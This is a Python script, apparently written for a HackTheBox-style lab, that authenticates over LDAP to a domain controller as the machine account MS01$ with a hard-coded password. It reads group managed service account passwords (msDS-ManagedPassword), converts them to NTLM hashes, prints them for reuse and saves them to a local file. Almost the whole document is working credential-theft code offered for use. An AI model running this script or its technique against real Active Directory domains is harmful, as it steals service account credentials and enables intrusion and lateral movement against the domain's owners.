#!/usr/bin/env python3 """ Extract gMSA password using MS01$ machine account via NTLM authentication """ import hashlib import struct import sys import os DC_IP = "10.129.9.78" DOMAIN = "pirate.htb" DOMAIN_DN = "DC=pirate,DC=htb" USERNAME = "MS01$" PASSWORD = "ms01" # Compute NTLM hash def ntlm(password): return hashlib.new('md4', password.encode('utf-16-le')).digest() ntlm_hash = ntlm(PASSWORD) print(f"[*] MS01$ NTLM hash: {ntlm_hash.hex()}") from impacket.ldap import ldap, ldapasn1 from impacket.ntlm import NTLMHash try: # Connect via LDAP with NTLM print(f"[*] Connecting to LDAP://{DC_IP} as {USERNAME}") ldapc = ldap.LDAPConnection(f"ldap://{DC_IP}", DOMAIN_DN, DC_IP) ldapc.login(USERNAME, PASSWORD, DOMAIN, '', '') print(f"[+] LDAP connected via NTLM as {USERNAME}") # Query gMSA accounts for msDS-ManagedPassword ATTRIBUTES = [ 'sAMAccountName', 'msDS-ManagedPassword', 'msDS-ManagedPasswordInterval', 'msDS-GroupMSAMembership', 'distinguishedName' ] print("\n[*] Searching for gMSA accounts with msDS-ManagedPassword...") sc = ldap.SimplePagedResultsControl(size=100) resp = ldapc.search( searchBase=DOMAIN_DN, searchFilter='(objectClass=msDS-GroupManagedServiceAccount)', attributes=ATTRIBUTES, sizeLimit=0, searchControls=[sc] ) found = False answers = [] for item in resp: if isinstance(item, ldapasn1.SearchResultEntry): answers.append(item) for item in answers: attribs = {} for attr in item['attributes']: attr_name = str(attr['type']) vals = [bytes(v) for v in attr['vals']] attribs[attr_name] = vals sam = attribs.get('sAMAccountName', [b'?'])[0].decode() print(f"\n[+] gMSA Account: {sam}") if 'msDS-ManagedPassword' in attribs and attribs['msDS-ManagedPassword']: found = True mp_blob = attribs['msDS-ManagedPassword'][0] print(f" [+] Got msDS-ManagedPassword blob ({len(mp_blob)} bytes)") # Parse MSDS-MANAGEDPASSWORD_BLOB version = struct.unpack_from('<H', mp_blob, 0)[0] current_pw_offset = struct.unpack_from('<H', mp_blob, 8)[0] prev_pw_offset = struct.unpack_from('<H', mp_blob, 10)[0] query_interval_offset = struct.unpack_from('<H', mp_blob, 12)[0] if prev_pw_offset > 0: pw_len = prev_pw_offset - current_pw_offset else: pw_len = query_interval_offset - current_pw_offset current_pw = mp_blob[current_pw_offset:current_pw_offset + pw_len] print(f" [+] Current Password blob ({len(current_pw)} bytes)") # NTLM = MD4(password_as_utf16le) ntlm_h = hashlib.new('md4', current_pw).hexdigest() print(f"\n [+] NTLM Hash: {ntlm_h}") print(f" [+] USE: {sam}:{ntlm_h}") # Save credentials out = f"{sam}:{ntlm_h}\n" with open(r"d:\mcp\gmsa_hashes.txt", "a") as f: f.write(out) print(f" [+] Saved to d:\\mcp\\gmsa_hashes.txt") else: print(f" [-] msDS-ManagedPassword: NOT READABLE") if not found: print("\n[-] No readable gMSA passwords found with MS01$ account") except Exception as e: print(f"[-] Error: {e}") import traceback traceback.print_exc()